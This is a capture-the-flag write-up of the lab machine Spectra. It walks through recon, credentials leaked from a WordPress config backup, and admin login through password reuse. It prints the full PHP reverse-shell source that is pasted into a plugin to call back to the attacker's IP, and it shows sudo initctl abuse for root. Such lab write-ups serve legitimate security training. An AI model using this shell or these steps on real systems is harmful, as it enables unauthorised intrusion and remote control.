---
description: 04/18/2022
---

# Spectra (Easy)

<figure><img src="../../../.gitbook/assets/image (5) (13).png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

<pre><code>PORT     STATE SERVICE VERSION
<strong>22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
</strong>80/tcp   open  http    nginx 1.17.4
3306/tcp open  mysql   MySQL (unauthorized)
</code></pre>

Enumerated UDP ports:

```
PORT     STATE         SERVICE  VERSION
68/udp   open|filtered dhcpc
5353/udp open|filtered zeroconf
```

Notes:



## Enumeration

### Port 80 - HTTP (nginx 1.17.4)

* Wordpress is running at <mark style="color:yellow;">spectra.htb/main</mark>

#### Directory Bruteforce

dirsearch:

```
dirsearch -u http://spectra.htb

Target: http://spectra.htb/

[22:05:12] Starting: 
[22:05:30] 200 -  283B  - /index.html
[22:05:32] 301 -  169B  - /main  ->  http://spectra.htb/main/
[22:05:33] 200 -   25KB - /main/
[22:05:41] 301 -  169B  - /testing  ->  http://spectra.htb/testing/
```

ffuf:

```
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u http://spectra.htb/testing/FUZZ -ac
[Status: 200, Size: 19915, Words: 3331, Lines: 385, Duration: 34ms]
    * FUZZ: /license.txt

[Status: 200, Size: 7278, Words: 740, Lines: 98, Duration: 33ms]
    * FUZZ: /readme.html

[Status: 200, Size: 2888, Words: 425, Lines: 91, Duration: 33ms]
    * FUZZ: /wp-config.php.save

[Status: 200, Size: 69, Words: 15, Lines: 1, Duration: 37ms]
    * FUZZ: /wp-content/plugins/akismet/akismet.php

[Status: 500, Size: 2804, Words: 223, Lines: 121, Duration: 385ms]
    * FUZZ: /wp-admin/setup-config.php
```

* <mark style="color:yellow;">/wp-config.php.save -- These .save files appear when backups are made on the server!</mark>
  * <mark style="color:yellow;">They may contain juicy information!</mark>
  * <mark style="color:yellow;">Since it is a .php file, view the source!</mark>

<mark style="color:red;">MySQL Credentials</mark> found in wp-config.php.save file:

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

feroxbuster:

```
feroxbuster -u http://spectra.htb -s 200,301,403

200      GET        6l       25w      283c http://spectra.htb/
301      GET        7l       11w      169c http://spectra.htb/main => http://spectra.htb/main/
301      GET        7l       11w      169c http://spectra.htb/testing => http://spectra.htb/testing/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes => http://spectra.htb/main/wp-includes/
301      GET        7l       11w      169c http://spectra.htb/main/wp-content => http://spectra.htb/main/wp-content/
301      GET        7l       11w      169c http://spectra.htb/main/wp-admin => http://spectra.htb/main/wp-admin/
301      GET        7l       11w      169c http://spectra.htb/main/wp-content/plugins => http://spectra.htb/main/wp-content/plugins/
301      GET        7l       11w      169c http://spectra.htb/main/wp-content/themes => http://spectra.htb/main/wp-content/themes/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/js => http://spectra.htb/main/wp-includes/js/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/images => http://spectra.htb/main/wp-includes/images/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/css => http://spectra.htb/main/wp-includes/css/
301      GET        7l       11w      169c http://spectra.htb/main/wp-content/uploads => http://spectra.htb/main/wp-content/uploads/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/assets => http://spectra.htb/main/wp-includes/assets/
301      GET        7l       11w      169c http://spectra.htb/main/wp-content/languages => http://spectra.htb/main/wp-content/languages/
301      GET        7l       11w      169c http://spectra.htb/main/wp-content/upgrade => http://spectra.htb/main/wp-content/upgrade/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/blocks => http://spectra.htb/main/wp-includes/blocks/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/fonts => http://spectra.htb/main/wp-includes/fonts/
301      GET        7l       11w      169c http://spectra.htb/main/wp-content/languages/themes => http://spectra.htb/main/wp-content/languages/themes/
301      GET        7l       11w      169c http://spectra.htb/main/wp-content/languages/plugins => http://spectra.htb/main/wp-content/languages/plugins/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/customize => http://spectra.htb/main/wp-includes/customize/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/images/media => http://spectra.htb/main/wp-includes/images/media/
301      GET        7l       11w      169c http://spectra.htb/main/wp-admin/includes => http://spectra.htb/main/wp-admin/includes/
301      GET        7l       11w      169c http://spectra.htb/main/wp-admin/images => http://spectra.htb/main/wp-admin/images/
301      GET        7l       11w      169c http://spectra.htb/main/wp-admin/css => http://spectra.htb/main/wp-admin/css/
301      GET        7l       11w      169c http://spectra.htb/main/wp-admin/js => http://spectra.htb/main/wp-admin/js/
301      GET        7l       11w      169c http://spectra.htb/main/wp-admin/user => http://spectra.htb/main/wp-admin/user/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/widgets => http://spectra.htb/main/wp-includes/widgets/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/js/tinymce => http://spectra.htb/main/wp-includes/js/tinymce/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/js/jquery => http://spectra.htb/main/wp-includes/js/jquery/
301      GET        7l       11w      169c http://spectra.htb/main/wp-admin/js/widgets => http://spectra.htb/main/wp-admin/js/widgets/
301      GET        7l       11w      169c http://spectra.htb/main/wp-admin/network => http://spectra.htb/main/wp-admin/network/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/css/dist => http://spectra.htb/main/wp-includes/css/dist/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/js/dist => http://spectra.htb/main/wp-includes/js/dist/
301      GET        7l       11w      169c http://spectra.htb/main/wp-admin/maint => http://spectra.htb/main/wp-admin/maint/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/js/thickbox => http://spectra.htb/main/wp-includes/js/thickbox/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/images/smilies => http://spectra.htb/main/wp-includes/images/smilies/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/certificates => http://spectra.htb/main/wp-includes/certificates/
301      GET        7l       11w      169c http://spectra.htb/main/wp-admin/css/colors => http://spectra.htb/main/wp-admin/css/colors/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/Text => http://spectra.htb/main/wp-includes/Text/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/js/swfupload => http://spectra.htb/main/wp-includes/js/swfupload/
301      GET        7l       11w      169c http://spectra.htb/main/wp-content/uploads/2020 => http://spectra.htb/main/wp-content/uploads/2020/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/js/crop => http://spectra.htb/main/wp-includes/js/crop/
301      GET        7l       11w      169c http://spectra.htb/main/wp-content/plugins/akismet => http://spectra.htb/main/wp-content/plugins/akismet/
301      GET        7l       11w      169c http://spectra.htb/main/wp-includes/images/crystal => http://spectra.htb/main/wp-includes/images/crystal/

```

#### Subdomain Enumeration

```
ffuf -u http://spectra.htb -H "Host: FUZZspectra.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 283
```

* No findings

#### Fingerprinting

whatweb:

<pre><code>whatweb http://spectra.htb

<strong>http://spectra.htb [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.17.4], IP[10.129.252.10], nginx[1.17.4]
</strong></code></pre>

#### wpscan

```
wpscan --url http://spectra.htb/main --api-token=place_api_token_here -e

WordPress version 5.4.2 identified (Insecure, released on 2020-06-10)

28 vulnerabilities identified:
```

User Identified:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

#### Nikto Web Scan

```
nikto -h http://spectra.htb

+ Target IP:          10.129.252.10
+ Target Hostname:    spectra.htb
+ Target Port:        80
+ Start Time:         2023-04-18 21:55:01 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.17.4
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /7T9Hq8ua.php#: Retrieved x-powered-by header: PHP/5.6.40.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /testing/: Directory indexing found.
+ /testing/: This might be interesting.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
```

## Exploitation

### Cleartext Credentials

* Cleartext credentials have been located in view-source:http://spectra.htb/testing//wp-config.php.save
* A case of password reuse has also been detected on [http://spectra.htb/main/wp-login.php](http://spectra.htb/main/wp-login.php)

<figure><img src="../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

* Although it does appear broken, we still successfully authenticated
* Now that we have administrator access on wordpress, we can use the metasploit module <mark style="color:yellow;">wp\_admin\_shell\_upload</mark> to gain a meterpreter reverse shell, or exploit a wordpress plugin which is what we will be showcasing.

### Wordpress Plugin Editor Reverse Shell Exploitation

1. Navigate to [http://spectra.htb/main/wp-admin/plugin-editor.php](http://spectra.htb/main/wp-admin/plugin-editor.php)
2. Select the Akismet plugin
3. Select the beginning of line 1 next to the < and press enter
4. Paste in the PHP reverse shell and select the blue "Update File" option
5. Start a nc listener&#x20;
6. Select "Plugins" and select "Activate" under the Akismet Anti-Spam plugin
7. You now have your reverse shell

#### Pentest Monkey PHP Reverse Shell Code:

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.38';
$port = 1337;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption><p>Exploitation Proof</p></figcaption></figure>

## Privilege Escalation

### Local enumeration

Inside of /home/user I was able to find two weird directores that look like hashes, but they are not.

* Tried `sudo -l`with no luck
* I could not get linpeas to become executable for some reason no matter which directory I ran it in
* Viewed /opt for non-standard packages and found a custom script that reads passwords from files -- /opt/autologin.conf

/opt/autologin.conf:

```bash
# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
end script
```

* It appears to be pointing to a file in /etc/autologin

Upon further enumeration, we are able to discover a passwd file in the autologin directory; revealing Katie's password: SummerHereWeCome

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

* Remembering that SSH is open, we try to authenticate there and it works

```
ssh katie@spectra.htb
password: SummerHereWeCome!!
```

### PrivEsc vector

Let's run `sudo -l` to see what we can do with sudo permissions.

```
(ALL) SETENV: NOPASSWD: /sbin/initctl
```

This means that we can inject malicious system commands into the initctl process using sudo (root) permissions which will grant us root.

* By placing the Python #2 script in here from revshells, I can then restart the job and it will execute a system command for me with root permissions

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* Start a nc listener on Kali

Execute the following to trigger the reverse shell:

```
sudo /sbin/initctl stop test
sudo /sbin/initctl start test
```

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
